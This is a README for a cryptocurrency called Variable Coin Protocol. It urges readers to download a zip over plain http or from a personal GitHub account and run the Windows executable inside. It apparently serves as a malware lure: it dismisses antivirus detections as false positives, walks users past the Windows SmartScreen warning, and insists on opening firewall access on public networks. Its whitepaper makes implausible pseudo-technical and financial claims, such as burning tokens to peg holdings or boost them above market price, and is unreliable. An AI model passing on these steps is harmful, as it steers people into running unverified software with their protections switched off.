<div align="center">

# Variable Coin Protocol (VCP)

[![Direct Download from Website](https://img.shields.io/badge/DIRECT_DOWNLOAD-OFFICIAL_WEBSITE-1f6feb?style=for-the-badge&logo=googlechrome&logoColor=white)](http://veriable2.com/download)
[![Download from GitHub Releases](https://img.shields.io/badge/DOWNLOAD_FROM-GITHUB_RELEASES-238636?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marianakamatotzs23-gif/veriable2/releases/latest)

*Autonomous, Dynamic Multi-Space Ledger with Algorithmic Variability & Dual-Coin Economics*

---

</div>

## 📥 Where & How to Download the Sovereign Desktop Node

Users have two official, independent channels to obtain the standalone Windows desktop client package (`veriable2-node.zip`):

### Option 1: Direct Download from Official Website
* **URL:** [http://veriable2.com/download](http://veriable2.com/download)
* **How it works:** Instant single-click direct download served straight from the core protocol showcase server.

### Option 2: Download from Official GitHub Releases
* **URL:** [GitHub Latest Release (v1.0.1)](https://github.com/marianakamatotzs23-gif/veriable2/releases/latest)
* **How it works:**
  1. Open the GitHub Releases link above.
  2. Scroll down to the **"Assets"** section.
  3. Click on **`veriable2-node.zip`** to download the official verified archive.
  4. Extract the zip file and launch `veriable2.exe` to run your sovereign P2P node.

---

## Technical Specification & Protocol Whitepaper

### 1. Access Architecture: Web Showcase vs. Sovereign Desktop Node Option

* **Web Showcase and Quick Access:** The web interface (`veriable2.com`) serves as an accessible entry point to the ecosystem, an informational showcase, and a distribution hub for downloading the desktop application. Users can explore network metrics and general protocol status directly through standard web browsers.
* **Local Installation Option (Desktop Sovereign Node - `veriable2.exe`):** Alongside the web interface, users have the option to run the application directly on their local machines. The desktop client connects straight to the serverless peer-to-peer (P2P) Distributed Hash Table (DHT) mesh without relying on intermediary web servers or third-party web runtimes.
* **Independent Verification & State Enforcement:** Operating a local desktop installation turns the client into an autonomous validation engine. Users independently verify block validity, engage directly in peer-to-peer block propagation, and enforce protocol invariant rules entirely on their own hardware.

---

### 2. Infinite Space Allocation & The Algorithmic 1% – 99% Variability Rule

* **The Philosophy of Dynamic Variability:** Unlike conventional blockchains where node influence is rigidly anchored to permanent hardware dominance, Variable Coin Protocol introduces an autonomous, rotating distribution architecture. Node responsibilities mutate across an infinite algorithmic space, dynamically balancing compute, bandwidth, and storage load across the network.
* **Daily Epoch Rotation (24-Hour State Shift):** Network responsibilities are never static. Every 24 hours, the protocol executes an automated epoch rotation. An operational tier is calculated algorithmically using the epoch seed and unique node identity:
  `Capacity Tier = (SHA256(Epoch_Seed || Node_ID) % 99) + 1`
  A node allocated a 95% capacity quota today can rotate to a lightweight 5% role tomorrow. This deterministic shuffling neutralizes long-term Sybil positioning and eliminates targeted denial-of-service (DoS) risks against top-tier validation nodes.
* **The Absolute 1% Floor (Anti-Freerider Guarantee):** To eliminate parasitic participants that consume ledger state without contributing computational reciprocity, the system enforces a non-negotiable minimum capacity floor of **1%**. No connected peer can operate at 0%; even low-resource consumer hardware must contribute at least a 1% active validation and storage share to maintain system-wide responsiveness.
* **The Absolute 99% Ceiling (Anti-Monopoly Mathematical Limit):** Network monopolization and single-entity cartels are mathematically precluded at the consensus layer. Any single space's capacity allocation is hard-capped at **99%** via `(hash % 99) + 1`. Even high-density industrial data centers or mining farms cannot monopolize 100% of the network; residual fractional capacity is cryptographically routed across independent peers.
* **Invisible Tier Execution Paradigm:** Node tier percentages, epoch rotations, and mathematical allocations run strictly beneath the abstraction layer. Client dashboards omit internal tier rankings to prevent targeted exploitation and stop adversaries from mapping high-capacity validation nodes.
* **Functional PoW Transformation:** Proof-of-Work ceases to be a wasteful hash lottery. PoW serves as an active allocation and verification engine, anchoring newly minted blocks across dynamic spaces bounded strictly between 1% and 99%.

---

### 3. Deterministic Data Retention & Distribution Affinity (Data Affinity)

* **Cryptographic Hash Pairing:** Blocks are not redundantly duplicated across every participant's physical storage, preventing arbitrary disk bloating. Upon block generation, the block hash is cryptographically combined with the peer's unique identifier to compute an **Affinity Score**:
  `Affinity Score = (SHA256(Block_Hash || Node_ID) % 99) + 1`
* **Storage Condition & Verification:** A node permanently indexes and preserves a data block if and only if:
  `Affinity Score <= Capacity Tier`
  Nodes rotated into higher tiers store larger subsets of the blockchain, whereas nodes in lower tiers preserve critical micro-shards.
* **Zero-Loss Fault Tolerance:** Ledger state is distributed probabilistically across infinite spaces. Because block availability is maintained across overlapping cryptographic affinity sets, ledger integrity survives mass peer disconnects and local hardware failures.
* **Hardware & Thermal Overflow Protection:** To safeguard heterogeneous consumer hardware during high-tier assignments, nodes execute autonomous resource governors (`overflow_matrix.json`). If local thermal thresholds or storage floor caps are approached, the node delegates excess storage load to neighboring DHT peers without breaking consensus.

---

### 4. Helper Token (Shield Coin): Tiered Power & Decimal Damping Economics

* **Dual Functional Division:** While Main Coin acts as a strictly capped, disinflationary store of value bounded by a 21,000,000 supply limit, Shield Coin functions as an elastic, algorithmic shock absorber engineered to counteract market volatility and systemic sell pressure.
* **Tiered Power & Difficulty Scale-Down:** Shield Coin impact power scales dynamically across economic tiers as global network adoption and circulating supply expand:
  * Base impact power begins at **99.0** and scales down through defined capacity milestones (99 -> 70 -> ...).
  * As cumulative supply grows, difficulty scales up while impact power steps down through progressive fractional decimal orders (0.1, 0.01, 0.001...). This mathematical dampening ensures that early participants cannot destabilize future network eras through accumulated token reserves.
* **Asset Value Pegging (Peg Price):** During market downturns or localized liquidity squeezes, participants can burn Shield Coins to anchor their effective holding price against a predetermined baseline, shielding capital value from broader market depreciation.
* **Asset Value Boosting (Boost Value):** Users deploy Shield Coin impact power to scale effective asset value beyond prevailing spot prices, establishing an active programmatic hedge against fiat devaluation.
* **Permanent Burn & Supply Contraction:** Triggering stabilization mechanisms permanently routes all consumed Shield Coins directly to the unrecoverable dead address:
  `0x000000000000000000000000000000000000dEaD`
  Burned tokens are expunged from the ledger permanently, contracting circulating supply to sustain long-term scarcity.

---

### 5. Dual Mining Mathematics & Asymptotic Emission Curves

* **Universal 99.0 Base Power:** Every initialized node commences mining operations with an abstract base computational power of **99.0**.
* **Main Coin Mining (99 -> 0 Linear Decay):**
  * Genesis blocks yield full mining block rewards of **50 coins** at 99 power.
  * As cumulative supply approaches 21,000,000, base operational power decays linearly (99 -> 80 -> 50 -> 1...), with mining block rewards reducing in direct proportion.
  * Upon minting the 21,000,000th coin, operational mining power locks at exactly **0.0**, terminating block rewards and permanently sealing total issuance.
* **Shield Coin Mining (99 -> 0.000001 Asymptotic Baseline):**
  * Shield Coin issuance is never terminated. Mining power decays gradually as cumulative volume and burn counts rise.
  * Emission decelerates toward an asymptotic lower bound of **0.000001**, never reaching absolute zero.
  * This persistent micro-issuance guarantees perpetual network liquidity, enabling nodes to continuously generate the micro-fuel necessary to execute stabilization, governance, and network defense commands indefinitely.

---

### 6. Client Execution, OS Security Architecture & P2P Firewall Conformance

* **PyInstaller Runtime & Heuristic Flags:** The Variable Coin desktop node is compiled as a standalone, self-extracting executable. Because the runtime unpacks core protocol dependencies into temporary OS directories and immediately executes `socket.bind()` commands without an expensive Extended Validation (EV) Code Signing Certificate, heuristic engines may flag the binary as anomalous. This is a highly documented **false positive** inherent to decentralized, open-source P2P daemons.
* **Windows SmartScreen Bypass Procedure:** When confronted with a *"Windows protected your PC"* interruption, users must select **"More info"** followed by **"Run anyway"**. The binary executes a pure Python runtime, combining a native `webview` interface and an ECDSA cryptographic engine, strictly devoid of underlying telemetry or hidden payload execution.
* **Firewall Matrix & Port Binding:** True decentralized P2P operation requires the host OS to allow inbound socket connections. The protocol binds to **TCP Port 6000** for direct peer-to-peer block gossiping and **UDP Port 6001** for continuous local and WAN discovery beacons. During the initial Windows Defender Firewall prompt, enabling **BOTH** *Private* and *Public* networks is mandatory to authorize the full bidirectional `listen()` socket hierarchy.
* **Asynchronous Outbound Fallback Engine:** To ensure resilience against restrictive corporate or ISP firewalls that aggressively drop inbound TCP packets, the node features an autonomous `_outbound_sync_loop`. If local port binding fails, the client seamlessly shifts to an outbound-only polling model. It periodically connects outward to authoritative bootstrap seed clusters, requests chain state differentials (`GET_CHAIN_HEIGHT`), and actively pulls missing JSON block payloads—guaranteeing 100% mining and ledger continuity without requiring manual router port-forwarding (UPnP).
